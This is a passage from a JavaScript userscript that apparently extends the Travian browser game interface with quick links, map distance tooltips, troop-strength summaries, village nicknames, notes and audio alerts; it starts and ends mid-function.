	RB_setValue(GMcookieID + 'AC', aClock);
	showAWake();
}
function showAWake () {
	var awD = $g(allIDs[28]);
	if( ! (awD) ) return;
	var aClock = parseInt(RB_getValue(GMcookieID + 'AC','0'));
	awD.innerHTML = '';
	if( aClock > 0 ) {
		var dTime = aClock - Math.round((new Date().getTime())/1000);
		var color = dTime < 0 ? 'red': 'black';
		if( dTime < 0 ) dTime = 0;
		timerB3[aClockTimer] = new Object();
		timerB3[aClockTimer].time = dTime;
		timerB3[aClockTimer].obj = $eT('SPAN',dTime, 3,[['style','margin:0px 10px;color:'+color+';']]);
		awD.appendChild(timerB3[aClockTimer].obj);
	} else awD.appendChild($ee('SPAN','--:--',[['title','click me']]));
}

function addSpeedAndRTSend ( iBl ) {
	if( /(&|\?)t=1(&|$)/.test(crtPath) ) return;
	var mLinks = $xf('.//a[contains(@href, "karte.php?")]', 'r', (typeof iBl == 'undefined' ? cont: iBl));
	for( var j = 0; j < mLinks.snapshotLength; j++ ) {
		var existT = $gc(allIDs[29],mLinks.snapshotItem(j));
		if( existT.length > 0 ) continue; else mLinks.snapshotItem(j).appendChild($e('SPAN',[['class',allIDs[29]]]));
		linkHint(mLinks.snapshotItem(j));
		distanceTooltip(mLinks.snapshotItem(j),1);
		sendResTropAdd(mLinks.snapshotItem(j), 1);
	}
}

function bigQuickLinks () {
	var bigIcon = [ // [type (true-id, false-ref), value, additional, img_ID, Dict, Dict additionnal, Background]
		[false, 'build.php?id=39'+(rpFL?(ver4FL?'':'&j&k'):''), '', 0, 6, 0, 0], // RP
		[true, 3, '', 3, 10, 0, 1], // Workshop
		[true, 0, '', 4, 7, 0, 1], // Market
		[false, 'allianz.php', '', 6, 1, 0, 2], // Ally
		[true, 1, '', 1, 8, 0, 3], // Barrack
		[true, 2, '', 2, 9, 0, 4], // Stable
		[true, 0, '&t=1', 5, 7, 11, 4], // Market in
		[false, 'allianz.php?s=3', '', 7, 1, 12, 5], // Ally attack
	];
	//icons 0-RP, 1-barrack, 2-stable, 3-workshop, 4-market, 5-market_in, 6-ally, 7-ally_attack
	//dorf2 0-market, 1-barracks, 2-stable, 3-workshop, 4-Tournament Square
	var newT = $e('TABLE',[['style','width:auto;background-color:transparent;float:'+docDir[0]+';border-collapse:collapse;'+(ver4FL?'':'margin-'+docDir[0]+':10px;')]]);
	var t = 0;
	var tdStyle = 'border:1px solid silver;background-color:white;';
	for( var i = 0; i < 2; i++) {
		var newR = $e('TR');
		for( var j = 0; j < 4; j++ ) {
			var tt = bigIcon[t][4] > 0 ? RB.dictionary[bigIcon[t][4]] : '';
			if( bigIcon[t][5] > 0 ) tt += ', ' + RB.dictionary[bigIcon[t][5]];
			if( bigIcon[t][0] ) {
				if( RB.village_Dorf2[bigIcon[t][1]] != 0 )
					var newD = $c($ee('A',$e('IMG',[['src',img_bigIcon[bigIcon[t][3]]]]),[['href','build.php?id='+RB.village_Dorf2[bigIcon[t][1]]+bigIcon[t][2]],['title',tt]]),[['style',tdStyle]]);
				else
					var newD = $c('');
			} else
				var newD = $c($ee('A',$e('IMG',[['src',img_bigIcon[bigIcon[t][3]]]]),[['href',bigIcon[t][1]],['title',tt]]),[['style',tdStyle]]);
			newR.appendChild(newD);
			t++;
		}
		newT.appendChild(newR);
	}
	if( ver4FL ) {
		if( RB.Setup[16] == 2 ) {
			if( ! ver42FL ) {
				var xy = offsetPosition($g("plusLink"));
				makeFloat(newT, xy[0]-25, xy[1]-14);
			} else {
				var xy = offsetPosition($gc("gold")[0]);
				makeFloat(newT, xy[0]-8, xy[1]-4);
			}
		} else makeFloatD(newT,8);
	} else {
		var insPoint = $g('plus');
		$at(insPoint,[['style','margin-left:10px;margin-right:10px;']]);
		$at($g('mtop'),[['style','width:650px;']]);
		insPoint.parentNode.insertBefore(newT, insPoint);
	}
}

function resourceBalance () {
if( ver4FL ) return;

	function resourceBalanceShow () {
		newA.removeEventListener('click', resourceBalanceShow, false);
		var aLink = fullName+'manual.php?typ=7&s='+uID;
		ajaxRequest(aLink, 'GET', null, function(ajaxResp) {
			var ad = ajaxNDIV(ajaxResp);
			var tbs = $gt('TABLE',ad);
			if( ! tbs ) return;
			if( RB.dictFL[5] == 0 ) {
				var h1 = $gt('h1',ad);
				if( h1 ) {
					var resDict = h1[0].innerHTML.onlyText();
					if( RB.dictionary[5] != resDict ) {
						RB.dictionary[5] = resDict;
						saveCookie( 'Dict', 'dictionary' );
						RB.dictFL[5] = 1;
						saveCookie( 'DictFL', 'dictFL' );
					}
				}
			}
			cont.appendChild($e('BR'));
			var newPP = $e('P');
			newPP.appendChild(tbs[1]);
			if( uID != userID ) {
				newPP.appendChild(tbs[0]);
			}
			cont.appendChild(newPP);
		}, dummy);
	}

	var uID = crtPath.match(/uid=(\d+)/)[1];
	var linksP = $g(allIDs[0]);
	// Call trav-help
	var newP = $ee('P',$e('IMG',[['src',img_bigIcon[4]],['style','float:'+docDir[0]+';padding:0px 15px;']]));
	var newA = $a(RB.dictionary[5],[['href',jsVoid]]);
	newA.addEventListener('click', resourceBalanceShow, false);
	newP.appendChild(newA);
	if( linksP ) linksP.appendChild(newP);
		else cont.appendChild(newP);
}

var onKarteFL = false;
function distanceTooltipGenK(e) {
	var hr = this;
	onKarteFL = true;
	setTimeout(function() { distanceTooltipGenK2( hr ) }, 50);
}
function distanceTooltipGenK2( hr ) {
	removeTooltipK ();
	if( hr.getAttribute('href') === null ) return;
	var cID = getVid(hr.getAttribute('href'));
	var dTTK = showAllTTime(0, cID, RB.village_Var[1]);
	$at(dTTK, [['style','background-color:white;']]); // #FFFFE0;
	windowID[2] = makeFloat( dTTK, (ltr?contRight-10:contRight-170), contTop+35);
	onKarteFL = false;
	var tr = $gc('tribe',cont);
	if( tr.length > 0 ) {
		var ht = getVTip(cID);
		if( ht != '' ) tr[0].appendChild($ee('SPAN',ht,[['style','color:'+vHColor+';margin:0px 10px;']]));
	}
}
function removeTooltipK () {
	var ttk = $g(windowID[2]);
	if( ttk ) {
		ttk.parentNode.removeChild(ttk);
		timerP.length = lastTimerP[0];
	}
}
function removeTooltipK2 () {
	onKarteFL = false;
	setTimeout(function(){ if( ! onKarteFL ) removeTooltipK(); }, 50);
}
function karteDistance3 () {
	var allCells = $gt('AREA',cont);
	if( ! allCells ) return;
	for( var i = 0; i < allCells.length; i++ ) {
		if( /karte.php\?d=/.test(allCells[i].getAttribute('href')) ) {
			allCells[i].addEventListener("mouseover", distanceTooltipGenK, false);
			allCells[i].addEventListener("mouseout", removeTooltipK2, false);
		}
	}
	var gcl = $g("raidFavs");
	if( ! gcl ) return;
	var mLinks = $xf('.//a[contains(@href, "a2b.php?")]', 'r', gcl);
	for( var j = 0; j < mLinks.snapshotLength; j++ ) {
		linkHint(mLinks.snapshotItem(j));
		distanceTooltip(mLinks.snapshotItem(j),1);
	}
	viewMessageIWK( gcl );
}

var topRS = 0;
function karteDistance () {
	if( ver4FL ) {
		topRS = contTop > 120 ? [85,70,90]: [-20,-20,-20];
		if( ! ver42FL && $gc('sideInfoAlly',$g(pageElem[2])).length == 0 ) topRS[RB.Setup[2]] += 30;
		karteDistance4();
	} else karteDistance3();
}

var tileDFL = true;
var activeTip = '';
function karteDistance4 () {
	var tipE = $g(windowID[2]);
	if( tipE ) tipE.parentNode.removeChild(tipE);
	var vilView = $g('tileDetails');
	if( vilView ) {
		if( tileDFL ) {
			addRefIGM('tileDetails');
			troopsOasis( vilView );
			viewMessageIWK( vilView );
			linkOnT4Karte( vilView );
			addFarmToMapT4( vilView );
		}
		tileDFL = false;
	} else {
		tileDFL = true;
		var tipE = $gc('tip-contents');
		var ttD = $g(allIDs[3]);
		if( tipE.length > 0 && ! ttD ) {
			var tipC = getVidFromCoords($gc('text elementText',tipE[0])[0].innerHTML);
			if( tipC > 0 ) {
				var newTip = getVTip(tipC);
				if( newTip != activeTip ) {
					activeTip = newTip;
					if( newTip != '' ) {
						var titleElem = $gc('title elementTitle',tipE[0])[0];
						titleElem.appendChild($ee('span',newTip,[['style','color:#77FF77;margin:0px 10px;']]));
					}
				}
				var dTTK = showAllTTime(0, tipC, RB.village_Var[1]);
				$at(dTTK, [['style','background-color:white;']]); // #FFFFE0;
				windowID[2] = makeFloat( dTTK, (ltr?contRight+5:contRight-180), contTop-topRS[RB.Setup[2]]);
			}
		}
	}
	setTimeout(karteDistance4, 1000);
}

function linkOnT4Karte ( vV ) {
	var vilView = vV || cont;
	var h1 = $gt('H1',vilView)[0];
	if( h1 ) {
		var spanLast = $gt('SPAN',h1);
		if( spanLast.length == 0 ) return;
		spanLast = spanLast[spanLast.length-1];
		if( RB.Setup[12]>0 ) {
			var xy = getVidFromCoords(h1.innerHTML);
			if( typeof flinks[xy] == 'undefined' ) {
				var al = $a('(+)',[['href',jsVoid],['title',gtext('addcur')],['style','margin:0px 10px;']]);
				al.addEventListener("click", addlinkT4, true);
			} else var al = $ee('SPAN',flinks[xy],[['style','color:#00CB00;margin:0px 10px;']]);
			spanLast.parentNode.insertBefore(al,spanLast);
		}
		if( /position_details/.test(crtPath) ) return;
		var ln = $gt('A',$gc('detailImage',vilView)[0]);
		if( ln.length > 0 ) {
			var xy = id2xy(getVid(ln[0].getAttribute('href')));
			spanLast.parentNode.insertBefore($a('->',[['href','position_details.php?x='+xy[0]+'&y='+xy[1]],['style','margin:0px 5px;']]),spanLast);
		}
	}
}

function rbNotes () {
	if( closeWindowN(3) ) return;

	function saveNotes () {
		RB_setValue(GMcookieID + 'notes',textNB.value);
		alert( 'saved' );
	}

	var nSize = [[40,15],[55,20],[70,30],[60,45],[40,8],[30,34]];
	var nText = RB_getValue(GMcookieID + 'notes','');
	var newNB = $e('TABLE');
	var textNB = $ee('TEXTAREA',nText,[['cols',nSize[RB.Setup[35]][0]],['rows',nSize[RB.Setup[35]][1]],['style', 'background-image: url('+img_underline+');background-repeat: repeat;']])
	newNB.appendChild($ee('TR',$c(textNB)));
	var saveB = $e('IMG',[['src',img_save]]);
	saveB.addEventListener('click', saveNotes, false);
	newNB.appendChild($ee('TR',$c(saveB,[['style','text-align: center']])));
	windowID[3] = makeFloatD( newNB, 5 );
}

function addRefIGM ( idBlock ) {
	if( RB.Setup[18] == 0 && RB.Setup[19] == 0 ) return;
	var idB = idBlock || pageElem[1];
	var mLinks = $xf('.//a[contains(@href, "spieler.php?uid=")]', 'l', $g(idB));
	for( var j = 0; j < mLinks.snapshotLength; j++ ) {
		var al = mLinks.snapshotItem(j);
		var uid = al.getAttribute('href').match(/uid=(\d+)/);
		if( uid ) uid = uid[1]; else continue;
		if( uid != userID ) {
			if( RB.Setup[19] > 0 ) al.parentNode.insertBefore($ee('A',trImg(allIDs[37]),[['href',userActivityServers( RB.Setup[19], uid, true )[1]],['target','_blank']]),  al.nextSibling);
			if( RB.Setup[18] > 0 ) al.parentNode.insertBefore($ee('A',trImg(allIDs[36]),[['href','nachrichten.php?t=1&id='+uid]]),  al.nextSibling);
		}
	}
	if( RB.Setup[19] > 0 ) {
		var mLinks = $xf('.//a[contains(@href, "allianz.php?aid=")]', 'r', $g(idB));
		for( var j = 0; j < mLinks.snapshotLength; j++ ) {
			var al = mLinks.snapshotItem(j);
			var uid = al.getAttribute('href').match(/aid=(\d+)/);
			if( uid ) uid = uid[1]; else continue;
			al.parentNode.insertBefore($ee('A',trImg(allIDs[37]),[['href',userActivityServers( RB.Setup[19], uid, false )[1]],['target','_blank']]),  al.nextSibling);
		}
	}
}

function parseAlly () {
	if( RB.dictFL[12] == 0 ) {
		var tm = $xf('.//a[@href="allianz.php?s=3"]','f',cont);
		if( tm ) {
			RB.dictionary[12] = tm.innerHTML.onlyText().trim();
			saveCookie( 'Dict', 'dictionary' );
			RB.dictFL[12] = 1;
			saveCookie( 'DictFL', 'dictFL' );
		}
	}
}

function addSpeedRTSendMessageInLLinks() {
	var llinks = $g(pageElem[4]);
	if( ! llinks ) return;
	if( RB.Setup[15] == 1 ) {
		var mLinks = $xf('tbody//a[contains(@href, "karte.php?")]', 'r', llinks);
		for( var j = 0; j < mLinks.snapshotLength; j++ ) {
			distanceTooltip(mLinks.snapshotItem(j),1);
			sendResTropAdd(mLinks.snapshotItem(j), 1);
		}
	}
	if( RB.Setup[15] == 1 ) {
		var mLinks = $xf('tbody//a[contains(@href, "spieler.php?uid=")]', 'r', llinks);
		for( var j = 0; j < mLinks.snapshotLength; j++ ) {
			var al = mLinks.snapshotItem(j);
			var uid = al.getAttribute('href').match(/uid=(\d+)/)[1];
			al.appendChild($ee('A',trImg(allIDs[36]),[['href','nachrichten.php?t=1&id='+uid]]));
		}
	}
}

function villageHintEdit () {
	function editVHint () {
		newVHint = prompt(gtext("name2"), vName);
		if( newVHint == null ) return;
		if( newVHint.length > 20 ) newVHint = newVHint.substr(0,20);
		if( RB.vHint[village_aid] != newVHint ) {
			RB.vHint[village_aid] = newVHint;
			saveOVCookie('vHint', RB.vHint);
			vName = newVHint;
			vNFC.innerHTML = vName;
		}
	}

	var vNF = ver4FL ? $g('villageNameField') : $gt('h1',cont)[0];
	var vName = RB.vHint[village_aid] || '';
	var vNFC = $ee('SPAN',vName,[['style','color:'+vHColor+';font-size:10px;']]);
	var vNFA = $ee('SPAN',vNFC,[['style','white-space:normal']]);
	var vNFe = trImg(allIDs[38],gtext('name2'));
	vNFe.addEventListener('click', editVHint, false);
	vNFA.appendChild(vNFe);
	if( ver42FL ) vNF.appendChild(vNFA);
	else if( ver4FL ) vNF.parentNode.insertBefore(vNFA, vNF.nextSibling);
	else vNF.appendChild(vNFA);
}

function villageHintDorf3 () {
	var newdidVH = [];
	for( i = 0; i < villages_id.length; i++ )
		newdidVH[linkVSwitch[i].match(/newdid=(\d+)/i)[1]] = villages_id[i];
	var mLinks = $xf('.//tr/td[1]/a[contains(@href, "newdid=")]', 'r', cont);
	for( var j = 0; j < mLinks.snapshotLength; j++ ) {
		var mLID = mLinks.snapshotItem(j).getAttribute('href').match(/newdid=(\d+)/)[1];
		linkHint( mLinks.snapshotItem(j), newdidVH[mLID] );
	}
}

function linkHint ( aLink, vID ) {
	try {
		var avID = vID || getVid(aLink.getAttribute('href'));
		if( isNaN(avID) ) return;
	} catch(e) { return; }
	if( RB.vHint[avID] != undefined ) {
		aLink.appendChild($ee('SPAN',' '+RB.vHint[avID],[['style','color:'+vHColor+';']]));
	} else {
		var ht = getVTip(avID);
		if( ht != '' ) {
			var ltext = aLink.innerHTML.onlyText().length;
			if( ltext < 20 )
				aLink.appendChild($ee('SPAN',' '+ht.substr(0,20-ltext),[['style','color:'+vHColor+';']]));
		}
	}
}

function setLC () {
	if( RB.Setup[1] > 0 ) return langs[RB.Setup[1]].match(/\((\w+)\)/)[1];
	lang = navigator.language;
	if( /^ar/i.test(lang) ) return 'ar';
	else if( /^bs/i.test(lang) || crtLang == 'ba' ) return 'bs';
	else if( /^bg/i.test(lang) ) return 'bg';
	else if( /^de/i.test(lang) ) return 'de';
	else if( /^fa/i.test(lang) ) return 'fa';
	else if( /^fr/i.test(lang) ) return 'fr';
	else if( /^hr/i.test(lang) || crtLang == 'hr' ) return 'hr';
	else if( /^hu/i.test(lang) ) return 'hu';
	else if( /^it/i.test(lang) ) return 'it';
	else if( /^pl/i.test(lang) ) return 'pl';
	else if( /^pt/i.test(lang) ) return 'pt';
	else if( /^ua/i.test(lang) || crtLang == 'ua' ) return 'ua';
	else if( /^ro/i.test(lang) ) return 'ro';
	else if( /^ru/i.test(lang) ) return 'ru';
	else if( /^sr/i.test(lang) ) return 'sr';
	else if( /^sv/i.test(lang) ) return 'sv';
	else if( /^tr/i.test(lang) ) return 'tr';
	else if( /^zh/i.test(lang) ) return 'zh';
	else if( /^vi/i.test(lang) ) return 'vi';
	else if( /^el/i.test(lang) || crtLang == 'gr' ) return 'el';
	else if( /^nl/i.test(lang) ) return 'nl';
	else return 'en';
}

function demolishSave () {
	var dem = $g('build');
	if( ! dem ) return;
	if( dem.getAttribute('class').indexOf('gid15') == -1 ) return;

	loadZVCookie('Dorf13','village_dorf13');
	var fl = false;
	var newCookie = [0];
	var t = 1;

	var dem = $g('demolish');
	if( ! dem ) {
		if( RB.village_dorf13[0] != 0 ) fl = true;
	} else {
		var descr = dem.rows;
		for( var i = 0; i < descr.length; i++ ) {
			newCookie[0]++;
			var td = descr[i].cells;
			newCookie[t++] = td[1].innerHTML.onlyText().trim();
			if( td.length < 4 ) {
				newCookie[t++] = 0;
				newCookie[t++] = '';
			} else {
				newCookie[t++] = Math.round(RunTime[0]/1000) + toSeconds(td[2].innerHTML);
				newCookie[t++] = td[3].innerHTML.onlyText().trim();
			}
		}
		fl = true;
	}
	if( fl ) saveVCookie('Dorf13',newCookie,1);
}

function calcAllTrops() {
	if( RB.Setup[10] == 0 ) return;
	var sumT = [0,0,0,0,0,0,0,0,0,0,0];
	var sumC = 0;
	var oFL = true;
	var uFL = true;
	var townTables = $xf('.//table[.//td[@class="role"]/a[contains(@href,"'+village_aid+'")]]','l',cont);
	if( townTables.snapshotLength == 0 ) return;
	var ownTable = false;
	for ( var i=0 ; i < townTables.snapshotLength; i++ ){
		var ttable = townTables.snapshotItem(i);
		uFL = (new RegExp("uid="+userID)).test(ttable.rows[0].cells[1].innerHTML);
		if( oFL || ! uFL ) for( var t=0; t<10; t++ ) {
			var tC = parseInt(ttable.rows[2].cells[t+1].innerHTML);
			if( isFinite(tC) ) { sumT[t] += tC; sumC += troopInfo( parseInt(RB.Setup[2])*10+t+1, 9) * tC; }
		}
		if( oFL && uFL ) {
			ownTable = ttable;
			if( ttable.rows[2].cells.length > 11 ) {
				var tC = parseInt(ttable.rows[2].cells[t+1].innerHTML);
				if( isFinite(tC) ) {
					sumT[10] += tC; sumC += tC*6;
				}
			}
			oFL = false;
		}
	}
	if( ownTable ) {
		var sumRow = ownTable.rows[2].cloneNode(true);
		for( var t=sumRow.cells.length-1; t>0; t-- ) {
			sumRow.cells[t].innerHTML = sumT[t-1];
			if( sumT[t-1] > 0 ) sumRow.cells[t].removeAttribute('class');
		}
		sumRow.cells[0].innerHTML = gtext('total');
		var existT = $gc(allIDs[20],ownTable);
		if( existT.length > 0 ) ownTable.removeChild(existT[0]);
		ownTable.appendChild($ee('TBODY',sumRow,[['class',allIDs[20]]]));
		var cropC = $gc('r4',ownTable);
		if( cropC.length > 0 ) {
			i = $g(allIDs[29]);
			if( i ) i.parentNode.removeChild(i);
			cropC[0].parentNode.appendChild($ee('SPAN',' ('+ sumC +') ',[['id',allIDs[29]]]));
		}
	}
}

function scanTropsData () {
	function scanTropsDataR ( hn ) {
		ajaxRequest(fullName +'manual.php?typ=1&s='+ hn, 'GET', null, function(ajaxResp) {
			var j = (hn-1)*10;
			var allTD = [];
			var helpText = ajaxResp.responseText;

			var ad = ajaxNDIV(ajaxResp);
			var allTD = $gt('td',ad);
			var t = 0; var tt = 0;
			var fl = false;
			var tmp = new Array(10);
			for(var i=0; i<allTD.length; i++) {
				var n = allTD[i].innerHTML.onlyText().match(/\d+/);
				if( n ) {
					if( parseRules[t++] ) tmp[tt++] = parseInt(n[0]);
				} else {
					fl = true; // new travian help
				}
			}
			for( var t=0; t<10; t++ ) {
				if( fl ) RB.tropsI[j++] = tmp[parseCont[t]];
					else RB.tropsI[j++] = tmp[t];
			}
			RB.dictTR[hn] = helpText.match(/alt="(.+?)"/)[1];
			RB.trFL[hn] = 1;
			saveCookie('trFL','trFL');
			saveCookie('tropsI','tropsI');
			saveCookie('DictTR','dictTR');
			if( RB.dictFL[18] == "0" ) {
				RB.dictionary[20] = helpText.match(/class="r5".+?alt="(.+?)"/)[1];
				saveCookie( 'Dict', 'dictionary' );
				RB.dictFL[18] = 1;
				saveCookie( 'DictFL', 'dictFL' );
			}
		}, dummy);
	}
//						0    1    2    3   4    5     6    7   8    9    10
	var parseRules = [true,true,true,true,true,true,true,true,true,true,false];
	var parseCont = [4,5,6,0,1,2,3,7,8,9];
	for( var i=0; i<31; i++ ) RB.trFL[i] = 0;
	if( RB.dictFL[13] == 1 ) {
		loadCookie('trFL','trFL');
		loadCookie( 'tropsI', 'tropsI' );
	} else {
		RB.trFL[0] = 1;
		RB.dictFL[13] = 1;
		saveCookie('DictFL','dictFL');
	}
	if( RB.Setup[20] == 2 ) {
		RB.dictFL[13] = 0;
		saveCookie('DictFL','dictFL');
		RB.Setup[20] = 1;
		saveCookie('RBSetup','Setup');
	}
	var curTO = 0;
	for( var i = 1; i < 31; i++ ) {
		if( RB.trFL[i] == 1 ) continue;
		curTO += getRandom(500,1000);
		setTimeout(function(x) { return function() { scanTropsDataR(x); }}(i), curTO);
	}
	if( curTO == 0 ) {
		RB.dictFL[13] = 2;
		saveCookie( 'DictFL', 'dictFL' );
	}
}

function troopInfo( tt, val ) {
	if( RB.dictFL[13] < 2 ) return 0;
	if( triFL ) {
		loadCookie( 'tropsI', 'tropsI' );
//						   1 2 3  4  5  6  7 8  9 10
		var parseRules2 = [-1,1,2,-1,-1,-1,-1,4,-1,3];
		var nature = [ //http://t4.answers.travian.com/index.php?aid=109
		[10,25,20,1,20],
		[20,35,40,1,20],
		[60,40,60,1,20],
		[80,66,50,1,20],
		[50,70,33,2,20],
		[100,80,70,2,20],
		[250,140,200,3,20],
		[450,380,240,3,20],
		[200,170,250,3,20],
		[600,440,520,5,20],
		[20,35,50,1,6], // natarian
		[65,30,10,1,7],
		[100,90,75,1],
		[0,10,0,1,25],
		[155,80,50,2,14],
		[170,140,80,3],
		[250,120,150,6,5],
		[60,45,10,5,3],
		[80,50,50,1,5],
		[30,40,40,1,5]];
		var j=RB.tropsI.length;
		for( var i=0; i<20; i++ )
			for( var t=0; t<10; t++ )
				RB.tropsI[j++] = parseRules2[t]<0? 0: nature[i][parseRules2[t]];
		triFL = false;
	}
	return parseInt(RB.tropsI[(tt-1)*10+val]);
}

function gti( p1, p2, p3 ) {
	return (troopInfo(parseInt(p1),p2)*p3).NaN0();
}
function troopsDorf1 () {
	if( RB.Setup[20] == 0 ) return;
	var tinfoT = $g('troops');
	if( ! tinfoT ) return;
	tiImg = trImg(allIDs[47]);
	tiImg.addEventListener("mouseover", showTroopsITT, false);
	tiImg.addEventListener("mouseout", removeTooltip, false);
	tinfoT.rows[0].cells[0].appendChild(tiImg);
}
function showTroopsITT () {
	var ITTb = $e('TBODY');
	var newITT = $ee('TABLE',ITTb,[['class',allIDs[7]]]);
	loadZVCookie('Dorf12','village_dorf12');
	var tt = 0;
	var tc = 0;
	var ti = [0,0,0,0,0];
	var ts = [0,0,0,0,0];
	for( var i = 0; i < RB.village_dorf12[0]; i++ ) {
		tn = RB.village_dorf12[i*2+1];
		tt = parseInt(tn);
		tc = parseInt(RB.village_dorf12[i*2+2]);
		var atfl = ( (tt%10) < 7 && troopInfo( tt, 9 ) > 1 ) ? false: true;
		ti = [atfl?gti(tt,0,tc):0, atfl?0:gti(tt,0,tc), gti(tt,1,tc), gti(tt,2,tc), gti(tt,9,tc)];
		if( tt > 30 ) ti[0]=0;
		ts = [atfl?ts[0]+ti[0]:ts[0], atfl?ts[1]:ts[1]+ti[1], ts[2]+ti[2], ts[3]+ti[3], ts[4]+ti[4]];
		ITTb.appendChild($em('TR',[$c(trImg('unit u'+tn)),$c(humanRF(ti[0])),$c(humanRF(ti[1])),$c(humanRF(ti[2])),$c(humanRF(ti[3])),$c(humanRF(ti[4]))]));
	}
	var tHead = $ee('THEAD',$em('TR',[$c('&#931;'),$c(humanRF(ts[0])),$c(humanRF(ts[1])),$c(humanRF(ts[2])),$c(humanRF(ts[3])),$c(humanRF(ts[4]))]));
	tHead.appendChild($em('TR',[$c(''),$em('TD',[trImg('att_all'),trImg('unit u13')]),$em('TD',[trImg('att_all'),trImg('unit u16')]),$c(trImg('def_i')),$c(trImg('def_c')),$c(trImg('r5'))]));
	newITT.appendChild(tHead);
	makeTooltip(newITT);
}

function getTroopsInOasis ( vf ) {
	var troopsTR = $xf('.//tr[td/img[contains(@class, "unit u")]]','l',vf );
	if( troopsTR.snapshotLength < 1 ) return false;
	var ITTb = $e('TBODY');
	var newITT = $ee('TABLE',ITTb,[['class',allIDs[7]]]);
	var ti = [0,0,0];
	var ts = [0,0,0];
	for( var i=0; i<troopsTR.snapshotLength; i++ ) {
		tt = parseInt($gt('IMG',troopsTR.snapshotItem(i))[0].getAttribute('class').match(/\d+/)[0]);
		tc = toNumber(troopsTR.snapshotItem(i).cells[1].innerHTML);
		ti = [gti(tt,1,tc), gti(tt,2,tc), gti(tt,9,tc)];
		ts = [ts[0]+ti[0], ts[1]+ti[1], ts[2]+ti[2]];
		ITTb.appendChild($em('TR',[$c(trImg('unit u'+tt)),$c(humanRF(ti[0])),$c(humanRF(ti[1])),$c(humanRF(ti[2]))]));
	}
	var tHead = $ee('THEAD',$em('TR',[$c('&#931;'),$c(humanRF(ts[0])),$c(humanRF(ts[1])),$c(humanRF(ts[2]))]));
	tHead.appendChild($em('TR',[$c(''),$c(trImg('def_i')),$c(trImg('def_c')),$c(trImg('r5'))]));
	newITT.appendChild(tHead);
	return newITT;
}
function troopsOasis ( vfS ) {
	if( RB.Setup[20] == 0 ) return;
	var vf = vfS || cont;
	var newITT = getTroopsInOasis(vf);
	var i = ver4FL? $gt('H4',vf): $g('troop_info');
	if(i && newITT) {
		addToolTip(newITT,(ver4FL? i[1]: i.rows[0].cells[0]));
		(ver4FL? i[1]: i).appendChild(oasisKirilloid(vf));
	}
}

function a2bInfo () {
	var ts = [0,0,0,0,0,0];
	if( raceFL ) {
		var troopImg = $xf('.//img[contains(@class,"unit u")]','f',cont);
		if( ! troopImg ) return;
		race = Math.floor(parseInt(troopImg.getAttribute('class').match(/\d+/)[0])/10);
		if( race != RB.Setup[2] ) {
			RB.Setup[2] = race;
			saveCookie( 'RBSetup', 'Setup' );
		}
		raceFL = false;
	}
	var inputs = $gt('INPUT',cont);
	for( var i=0; i<inputs.length; i++ ) {
		if( /t\d+/.test(inputs[i].getAttribute('name')) ) {
			var rtt = parseInt(inputs[i].getAttribute('name').match(/\d+/)[0]);
			if( rtt == 11 ) continue;
			var tt = rtt+(parseInt(RB.Setup[2])*10);
			var tc = parseInt(inputs[i].value);
			if( isNaN(tc) ) continue;
			var atfl = ( rtt < 7 && troopInfo( tt, 9 ) > 1 ) ? false: true;
			ts = [atfl?ts[0]+gti(tt,0,tc):ts[0], atfl?ts[1]:ts[1]+gti(tt,0,tc), ts[2]+gti(tt,1,tc), ts[3]+gti(tt,2,tc), ts[4]+gti(tt,8,tc), ts[5]+gti(tt,9,tc)];
		}
	}
	var rP = $g(allIDs[21]);
	if( rP ) rP.parentNode.removeChild(rP);
	rP = $e('P',[['id',allIDs[21]],['style','max-width:50%;']]);
	rT = $e('TABLE',[['class',allIDs[7]]]);
	rT.appendChild($em('TR',[$c(''),$c(trImg('unit u13')),$c(trImg('unit u16'))]));
	rT.appendChild($em('TR',[$c(trImg('att_all')),$c(humanRF(ts[0])),$c(humanRF(ts[1]))]));
	rT.appendChild($em('TR',[$c(trImg('def1')),$c(humanRF(ts[2])),$c(humanRF(ts[3]))]));
	rT.appendChild($ee('TR',$c('',[['colspan','3']])));
	rT.appendChild($em('TR',[$c(trImg('r5')),$c(humanRF(ts[5]),[['colspan','2']])]));
	rT.appendChild($em('TR',[$c(trImg(allIDs[33])),$c(humanRF(ts[4]),[['colspan','2']])]));
	rP.appendChild(rT);
	if( $g('btn_ok') ) $g('btn_ok').parentNode.appendChild(rP);
	else if( $g('raidListSlot') ) insertAfter(rP, $g('raidListSlot'));
}

function show_alert () {
	var nt = new Date().getTime();
	if( lastAlert > nt-5e3 ) return;
	var audioT = $g(allIDs[22]);
	if( audioT ) audioT.parentNode.removeChild(audioT);
	switch (parseInt(RB.Setup[28])) {
		case 1: // alert
				alert('ding ding');
				break;
		case 2: // HTML5 audio
				cont.appendChild($e('AUDIO',[['id',allIDs[22]],['src',RB.Setup[29]],['autoplay','true'],['loop','false']]));
				break;
		case 3: // EMBED audio
				cont.appendChild($e('EMBED',[['id',allIDs[22]],['src',RB.Setup[29]],['hidden','true'],['autostart','true'],['loop','false']]));
				break;
		case 4: // FLASH player
				cont.appendChild($e('EMBED',[['id',allIDs[22]],['type','application/x-shockwave-flash'],['flashvars','audioUrl='+RB.Setup[29]+'&autoPlay=true'],['src','http://www.google.com/reader/ui/3523697345-audio-player.swf'],['width',400],['height',27],['quality','best']]));
				break;
	}
	lastAlert = nt;
}

function testAudio () {
	var sW = $g(windowID[0]);
	if( ! sW ) return;
	lastAlert = 0;
	RB.Setup[28] = $gn(28)[0].value;
	RB.Setup[29] = $gn(29)[0].value;
	show_alert();
}

/************************* begin test zone ***************************/

function crannyCalc () {
	var allB = $gc('number',cont);
	if( allB.length == 0 ) allB = $gt('B',cont);
	var cap = parseInt(allB[0].innerHTML);
	if( isNaN(cap) ) return;
	var s = parseInt(RB.Setup[24])/100;
	$at(allB[0],[['title',Math.round(cap*s)]]);
	var newT = $e('TABLE',[['class',allIDs[7]],['style','margin:2px 30px;']]);
	var t = timerB.length;
	for( var i=0; i<4; i++ ) {
		var pc = resNow[i] < cap ? Math.round(resNow[i]/cap*100) : 100;
		var color = 'red';
		if( incomepersecond[i] > 0 && pc < 100 ) {
			timerB[t] = new Object();
			timerB[t].time = Math.round((cap-resNow[i])/incomepersecond[i]);
			timerB[t].obj = $eT('TD',timerB[t].time, 0);
			var ct = timerB[t++].obj;
			color = 'green';
		} else var ct = $c('--:-- ');
		var ca = $c((resNow[i]-cap),[['style','color:'+color+';']]);
		color = 'red';
		if( incomepersecond[i] > 0 && pc < parseInt(RB.Setup[24]) ) {
			timerB[t] = new Object();
			timerB[t].time = Math.round((cap*s-resNow[i])/incomepersecond[i]);
